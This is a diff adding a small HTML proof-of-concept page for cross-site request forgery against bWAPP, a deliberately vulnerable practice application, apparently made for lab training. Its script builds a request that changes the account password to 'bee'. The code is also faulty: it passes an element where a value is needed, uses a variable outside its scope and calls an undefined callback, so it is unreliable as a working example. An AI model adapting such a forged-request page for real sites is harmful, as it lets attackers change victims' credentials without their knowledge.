@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+	<h1>POC CSRF</h1>
+	<form>
+		Enter bWAPP Password:<input type="password" id="password" placeholder="password">
+	</form>
+	<script>
+		function httpGet(theURL)
+		{
+			var pass = document.getElementById("password");
+			var url = "http://localhost/bWAPP/csrf_1.php?password_curr="+pass+"&password_conf=bee&act"+"ion=change&password_new=bee";
+			var xmlHttp = new XMLHttpRequest();
+			xmlHttp.onreadystatechange = function(){
+				if(xmlHttp.readyState == 4 && xmlHttp.status == 200)
+					callback(xmlHttp.responseText);
+			}
+			xmlHttp.open("GET",theURL,true);
+			xmlHttp.send(null);
+		}
+	</script>
+	</br>
+	<button onclick=httpGet(url)>click me!</button>
+</html>
